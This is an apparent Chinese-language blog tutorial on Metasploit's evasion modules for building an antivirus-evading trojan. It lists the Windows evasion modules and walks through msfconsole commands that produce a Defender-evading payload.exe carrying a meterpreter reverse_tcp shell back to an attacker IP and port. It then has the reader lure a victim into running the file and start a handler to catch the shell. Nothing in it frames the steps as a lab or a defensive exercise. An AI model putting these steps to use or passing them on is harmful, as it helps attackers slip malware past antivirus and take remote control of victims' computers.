# 原创
：  【MSFconsole进阶】evasion（免杀模块）：免杀模块使用方法，相关设置

# 【MSFconsole进阶】evasion（免杀模块）：免杀模块使用方法，相关设置

**目录**

[一、简介：](#%E4%B8%80%E3%80%81%E7%AE%80%E4%BB%8B%EF%BC%9A)

[二、使用方法：](#%E4%BA%8C%E3%80%81%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95%EF%BC%9A)

[2.1、第一步：选择一个免杀模块](#2.1%E3%80%81%E7%AC%AC%E4%B8%80%E6%AD%A5%EF%BC%9A%E9%80%89%E6%8B%A9%E4%B8%80%E4%B8%AA%E5%85%8D%E6%9D%80%E6%A8%A1%E5%9D%97)

[2.1.1、#查看免杀模块](#2.1.1%E3%80%81%23%E6%9F%A5%E7%9C%8B%E5%85%8D%E6%9D%80%E6%A8%A1%E5%9D%97)

[2.1.2、#选择免杀模块](#2.1.2%E3%80%81%23%E9%80%89%E6%8B%A9%E5%85%8D%E6%9D%80%E6%A8%A1%E5%9D%97)

[2.2、第二步：设置产生的相关参数](#2.2%E3%80%81%E7%AC%AC%E4%BA%8C%E6%AD%A5%EF%BC%9A%E8%AE%BE%E7%BD%AE%E4%BA%A7%E7%94%9F%E7%9A%84%E7%9B%B8%E5%85%B3%E5%8F%82%E6%95%B0)

[2.2.1、#设置输出文件名](#2.2.1%E3%80%81%23%E8%AE%BE%E7%BD%AE%E8%BE%93%E5%87%BA%E6%96%87%E4%BB%B6%E5%90%8D)

[2.2.2、#设置使用的payload](#2.2.2%E3%80%81%23%E8%AE%BE%E7%BD%AE%E4%BD%BF%E7%94%A8%E7%9A%84payload)

[2.2.3、#设置监听端口/ip](#2.2.3%E3%80%81%23%E8%AE%BE%E7%BD%AE%E7%9B%91%E5%90%AC%E7%AB%AF%E5%8F%A3%2Fip)

[2.3、第三步：生成](#2.3%E3%80%81%E7%AC%AC%E4%B8%89%E6%AD%A5%EF%BC%9A%E7%94%9F%E6%88%90)

[2.3.1、#生成木马文件](#2.3.1%E3%80%81%23%E7%94%9F%E6%88%90%E6%9C%A8%E9%A9%AC%E6%96%87%E4%BB%B6)

[2.4、第四步：植入目标电脑](#2.4%E3%80%81%E7%AC%AC%E5%9B%9B%E6%AD%A5%EF%BC%9A%E6%A4%8D%E5%85%A5%E7%9B%AE%E6%A0%87%E7%94%B5%E8%84%91)

[2.5、第五步：监听](#2.5%E3%80%81%E7%AC%AC%E4%BA%94%E6%AD%A5%EF%BC%9A%E7%9B%91%E5%90%AC)

---


## 一、简介：

> 
Evasion模块，官方宣称这个模块可以创建反杀毒软件的木马
能不能被查出来，还是要看几率的事情


---


---


## 二、使用方法：

> 
<h3>2.1、第一步：选择一个免杀模块</h3>
<h4>2.1.1、#查看免杀模块</h4>
show evasion

0  evasion/windows/applocker_evasion_install_util
Applocker逃避 -  .NET框架安装实用程序
<hr/>
1  evasion/windows/applocker_evasion_msbuild
Applocker逃避-MSBUILD
<hr/>
2  evasion/windows/applocker_evasion_presentationhost
Applocker逃避 - Windows演示基础Host
<hr/>
3  evasion/windows/applocker_evasion_regasm_regsvcs
Applocker逃避-Microsoft .NET组装注册实用程序
<hr/>
4  evasion/windows/applocker_evasion_workflow_compiler
Applocker逃避 -  Microsoft Workflow编译器
<hr/>
5  evasion/windows/process_herpaderping
过程Herpaderping逃避技术
<hr/>
6  evasion/windows/syscall_inject
直接Windows Syscall逃避技术
<hr/>
7  evasion/windows/windows_defender_exe
Microsoft Windows Defender Evasive可执行
<hr/>
8  evasion/windows/windows_defender_js_hta
Microsoft Windows Defender Evasive JS.NET和HTA
<hr/>

<h4>2.1.2、#选择免杀模块</h4>
use windows/windows_defender_exe
#查看选项
show options




---


---


---


---


#### 2.1.2、#选择免杀模块

> 
<h3>2.2、第二步：设置产生的相关参数</h3>
<h4>2.2.1、#设置输出文件名</h4>
set filename payload.exe
<hr/>
<h4>2.2.2、#设置使用的payload</h4>
set payload windows/meterpreter/reverse_tcp
<hr/>
<h4>2.2.3、#设置监听端口/ip</h4>
set LHOST 192.168.190.131
set LPORT 4444
（注：这个其实上面默认的是本机，这里可以更改为其他的）




#### 2.2.2、#设置使用的payload

---


> 
<h3>2.3、第三步：生成</h3>
<h4>2.3.1、#生成木马文件</h4>
exploit





> 
<h3>2.4、第四步：植入目标电脑</h3>
诱导……


> 
<h3>2.5、第五步：监听</h3>
handler -H 192.168.190.131 -P 4444 -p windows/meterpreter/reverse_tcp

